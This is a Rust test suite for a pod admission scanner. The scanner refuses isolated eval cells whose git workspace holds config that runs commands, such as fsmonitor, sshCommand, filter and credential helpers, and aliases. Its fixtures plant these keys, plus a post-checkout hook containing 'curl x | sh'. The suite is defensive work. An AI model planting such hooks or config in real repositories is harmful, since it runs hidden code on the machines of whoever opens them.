//! ADR 0013: an eval cell whose workspace carries exec-bearing git config is
//! refused by name; a clean one, or one with only `.sample` hooks, is admitted;
//! a standard pod is admitted with its findings recorded.

use super::*;

/// A clean clone's `.git`: a config with no exec-bearing key, the sample hooks
/// `git init` writes, and some object data.
fn repo(root: &Path) {
    std::fs::create_dir_all(root.join(".git/hooks")).expect("hooks");
    std::fs::create_dir_all(root.join(".git/objects/ab")).expect("objects");
    std::fs::write(
        root.join(".git/config"),
        "[core]\n\trepositoryformatversion = 0\n\tbare = false\n[remote \"origin\"]\n\turl = https://example.invalid/r.git\n",
    )
    .expect("config");
    for hook in [
        "pre-commit.sample",
        "post-update.sample",
        "fsmonitor-watchman.sample",
    ] {
        std::fs::write(root.join(".git/hooks").join(hook), "#!/bin/sh\n").expect("sample");
    }
    std::fs::write(root.join("README"), "a repo\n").expect("readme");
}

/// The hostile shapes, each as (what the refusal must name, how to plant it).
const HOSTILE: &[(&str, &str, &str)] = &[
    (
        "core.fsmonitor",
        ".git/config",
        "[core]\n\tfsmonitor = ./x.sh\n",
    ),
    (
        "core.hooksPath",
        ".git/config",
        "[core]\n\thooksPath = .githooks\n",
    ),
    (
        "core.sshCommand",
        ".git/config",
        "[core]\n\tsshCommand = ./x.sh\n",
    ),
    ("core.pager", ".git/config", "[core]\n\tpager = ./x.sh\n"),
    ("core.editor", ".git/config", "[core]\n\teditor = ./x.sh\n"),
    (
        "diff.<driver>.textconv",
        ".git/config",
        "[diff \"x\"]\n\ttextconv = ./x.sh\n",
    ),
    (
        "filter.<driver>.smudge",
        ".git/config",
        "[filter \"x\"]\n\tsmudge = ./x.sh\n",
    ),
    (
        "filter.<driver>.process",
        ".git/config",
        "[filter \"x\"]\n\tprocess = ./x.sh\n",
    ),
    (
        "uploadpack.packObjectsHook",
        ".git/config",
        "[uploadpack]\n\tpackObjectsHook = ./x.sh\n",
    ),
    ("alias.*", ".git/config", "[alias]\n\tst = !sh -c x\n"),
    (
        "credential[.<url>].helper",
        ".git/config",
        "[credential]\n\thelper = !./x.sh\n",
    ),
    (
        "include.path",
        ".git/config",
        "[include]\n\tpath = ../x.cfg\n",
    ),
    (
        "git hook",
        ".git/hooks/post-checkout",
        "#!/bin/sh\ncurl x | sh\n",
    ),
];

fn directory(path: &Path) -> Source {
    Source {
        field: "work_dir",
        form: Form::Directory,
        path: path.to_path_buf(),
    }
}

fn read_one(source: Source, profile: IsolationProfile) -> Vec<(Source, Read)> {
    let staging = tempfile::tempdir().expect("staging");
    let r = read(&source, profile, staging.path());
    vec![(source, r)]
}

#[test]
fn an_eval_cell_is_refused_for_each_hostile_key_naming_the_path_and_key() {
    for (names, path, content) in HOSTILE {
        let w = tempfile::tempdir().expect("ws");
        repo(w.path());
        std::fs::write(w.path().join(path), content).expect("plant");
        let refused = decide(
            IsolationProfile::EvalCell,
            &read_one(directory(w.path()), IsolationProfile::EvalCell),
        )
        .expect_err(names);
        assert!(refused.listing.contains(path), "{names}: {refused}");
        assert!(refused.listing.contains(names), "{names}: {refused}");
        assert!(refused.to_string().contains("eval-cell"), "{refused}");
    }
}

#[test]
fn a_clean_repository_and_one_with_only_sample_hooks_are_admitted_for_an_eval_cell() {
    let w = tempfile::tempdir().expect("ws");
    std::fs::write(w.path().join("README"), "no repo at all\n").expect("file");
    let reads = read_one(directory(w.path()), IsolationProfile::EvalCell);
    assert_eq!(decide(IsolationProfile::EvalCell, &reads), Ok(None));
    repo(w.path());
    let reads = read_one(directory(w.path()), IsolationProfile::EvalCell);
    assert_eq!(decide(IsolationProfile::EvalCell, &reads), Ok(None));
}

#[test]
fn a_workspace_that_could_not_be_scanned_refuses_an_eval_cell() {
    let gone = tempfile::tempdir().expect("ws").path().join("absent");
    let reads = read_one(directory(&gone), IsolationProfile::EvalCell);
    let refused = decide(IsolationProfile::EvalCell, &reads).expect_err("could not look");
    assert!(
        refused.listing.contains("could not be scanned"),
        "{refused}"
    );
}

#[test]
fn a_standard_pod_is_admitted_with_its_findings_recorded_and_a_clean_one_unlabelled() {
    let w = tempfile::tempdir().expect("ws");
    repo(w.path());
    let reads = read_one(directory(w.path()), IsolationProfile::Standard);
    assert_eq!(decide(IsolationProfile::Standard, &reads), Ok(None));
    std::fs::write(w.path().join(".git/hooks/pre-push"), "x").expect("hook");
    let reads = read_one(directory(w.path()), IsolationProfile::Standard);
    let recorded = decide(IsolationProfile::Standard, &reads)
        .expect("a standard pod is not refused")
        .expect("and its finding is recorded");
    assert!(recorded.contains(".git/hooks/pre-push"), "{recorded}");
}

#[test]
fn a_standard_pod_s_disk_image_is_not_read() {
    let source = Source {
        field: "image.scratch_path",
        form: Form::Image,
        path: PathBuf::from("/nonexistent/disk.ext4"),
    };
    let reads = read_one(source, IsolationProfile::Standard);
    assert!(matches!(reads[0].1, Read::Skipped), "{:?}", reads[0].1);
    assert_eq!(decide(IsolationProfile::Standard, &reads), Ok(None));
}

#[test]
fn the_sources_are_the_disks_on_firecracker_and_the_work_dir_on_a_container() {
    let mut spec: PodSpec = serde_json::from_str(
        r#"{"apiVersion":"nucleus/v1","kind":"Pod","spec":{"work_dir":"/w","image":{
            "kernel_path":"/k","rootfs_path":"/r","scratch_path":"/s.ext4","data_path":"/d.ext4"}}}"#,
    )
    .expect("spec");
    let fc = sources(&spec, &DriverKind::Firecracker);
    assert_eq!(
        fc.iter().map(|s| (s.field, s.form)).collect::<Vec<_>>(),
        vec![
            ("image.scratch_path", Form::Image),
            ("image.data_path", Form::Image)
        ]
    );
    assert_eq!(
        sources(&spec, &DriverKind::Container),
        vec![Source {
            field: "work_dir",
            form: Form::Directory,
            path: PathBuf::from("/w")
        }]
    );
    spec.spec.image = None;
    assert!(
        sources(&spec, &DriverKind::Firecracker).is_empty(),
        "a node-made scratch disk is empty: nothing enters"
    );
}

/// Wired: `create_pod_internal` scans at function-body level, after the paths
/// are confined and the profile decided, and before the authority gate and any
/// driver, with the profile the eval-cell decider returned.
#[test]
fn create_scans_the_workspace_after_confinement_and_before_any_driver() {
    let main = include_str!("main.rs");
    let body = main
        .find("async fn create_pod_internal(")
        .expect("create_pod_internal exists");
    let at = |needle: &str| {
        main[body..]
            .find(needle)
            .map(|i| body + i)
            .unwrap_or_else(|| panic!("create_pod_internal contains {needle:?}"))
    };
    let scan = at(
        "workspace_scan::admit(&state.state_dir, &state.driver, &mut spec, profile, id).await?;",
    );
    assert!(
        at("host_paths::admit(&mut spec") < scan,
        "paths confined first"
    );
    assert!(
        at("let profile = eval_cell::admit_on(") < scan,
        "profile decided first"
    );
    assert!(
        scan < at("state.authority.admit_pod("),
        "before the authority gate"
    );
    assert!(
        scan < at("let spawned = match state.driver"),
        "before any driver"
    );
    let indent = main[..scan].rsplit('\n').next().unwrap_or("");
    assert_eq!(indent, "    ", "unconditional, at function-body level");
}

#[tokio::test]
async fn admission_refuses_an_eval_cell_and_labels_a_standard_pod() {
    let state = tempfile::tempdir().expect("state");
    let w = tempfile::tempdir().expect("ws");
    repo(w.path());
    std::fs::write(
        w.path().join(".git/config"),
        "[core]\n\tfsmonitor = ./x.sh\n",
    )
    .expect("plant");
    let mut spec: PodSpec = serde_json::from_str(&format!(
        r#"{{"apiVersion":"nucleus/v1","kind":"Pod","spec":{{"work_dir":"{}"}}}}"#,
        w.path().display()
    ))
    .expect("spec");

    let err = admit(
        state.path(),
        &DriverKind::Container,
        &mut spec,
        IsolationProfile::EvalCell,
        Uuid::new_v4(),
    )
    .await
    .expect_err("an eval cell carrying core.fsmonitor");
    assert!(err.to_string().contains("core.fsmonitor"), "{err}");
    assert!(!spec.metadata.labels.contains_key(LABEL));

    admit(
        state.path(),
        &DriverKind::Container,
        &mut spec,
        IsolationProfile::Standard,
        Uuid::new_v4(),
    )
    .await
    .expect("a standard pod is admitted");
    let recorded = spec.metadata.labels.get(LABEL).expect("recorded");
    assert!(recorded.contains("core.fsmonitor"), "{recorded}");
}

/// The composition the eval cell rests on: the real seeder builds the disk a
/// caller names as `image.scratch_path`, and the scan reads that disk.
#[tokio::test]
async fn a_seeded_disk_carrying_exec_config_is_refused_and_a_clean_one_admitted() {
    use nucleus_microvm_host::ext4::{Ext4Error, RootOwner};
    use nucleus_microvm_host::jail_user::JailUser;
    use std::os::unix::fs::MetadataExt;

    let tmp = tempfile::tempdir().expect("tmp");
    let me = std::fs::metadata(tmp.path()).expect("meta");
    let jail = JailUser {
        uid: me.uid(),
        gid: me.gid(),
    };
    let owner = RootOwner {
        uid: 65534,
        gid: 65534,
    };
    for (hostile, expect_refused) in [(false, false), (true, true)] {
        let tree = tmp.path().join(format!("tree-{hostile}"));
        repo(&tree);
        if hostile {
            std::fs::write(tree.join(".git/config"), "[core]\n\tfsmonitor = ./x.sh\n")
                .expect("plant");
            std::fs::write(tree.join(".git/hooks/post-checkout"), "x").expect("hook");
        }
        let image = tmp.path().join(format!("ws-{hostile}.ext4"));
        match nucleus_microvm_host::workspace::seed(&tree, &image, owner, jail, 16).await {
            Ok(_) => {}
            Err(Ext4Error::Unsupported { .. })
                if std::env::var_os("NUCLEUS_E2FSPROGS_REQUIRED").is_none() =>
            {
                eprintln!("skipping: this host's mke2fs cannot seed from a tar");
                return;
            }
            Err(e) => panic!("seed: {e}"),
        }
        let source = Source {
            field: "image.scratch_path",
            form: Form::Image,
            path: image,
        };
        let reads = read_one(source, IsolationProfile::EvalCell);
        match (decide(IsolationProfile::EvalCell, &reads), expect_refused) {
            (Ok(None), false) => {}
            (Err(refused), true) => {
                assert!(refused.listing.contains("core.fsmonitor"), "{refused}");
                assert!(
                    refused.listing.contains(".git/hooks/post-checkout"),
                    "{refused}"
                );
            }
            (other, _) => panic!("hostile={hostile}: {other:?} ({:?})", reads[0].1),
        }
    }
}
